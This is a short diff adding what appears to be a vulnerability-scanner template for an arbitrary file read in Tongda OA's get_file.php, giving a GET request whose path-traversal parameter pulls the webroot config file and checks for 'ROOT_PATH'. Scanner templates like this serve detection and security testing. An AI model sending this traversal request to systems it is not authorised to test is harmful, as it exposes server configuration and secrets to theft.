@@ -1,0 +1,12 @@
+name: 通达OA-get_file-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config
+    expression:
+      status: 200
+      body_all:
+        - "ROOT_PATH"
